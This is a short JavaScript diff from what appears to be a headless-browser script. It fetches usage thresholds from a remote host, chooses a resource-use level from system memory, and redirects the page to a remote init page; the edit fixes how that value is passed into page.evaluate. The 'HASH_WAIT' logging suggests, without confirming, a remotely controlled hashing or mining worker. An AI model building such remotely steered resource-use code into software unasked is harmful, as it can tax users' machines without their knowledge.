@@ -75,9 +75,9 @@
         let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
         minUse = min;
         maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
-        await page.evaluate(() => {
+        await page.evaluate((maxUse) => {
           if (window.use != maxUse) window.location.href = 'https://ab498.pythonanywhere.com/files/init.html?use=' + maxUse;
-        });
+        }, maxUse);
       } else {
         tstt({
           message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
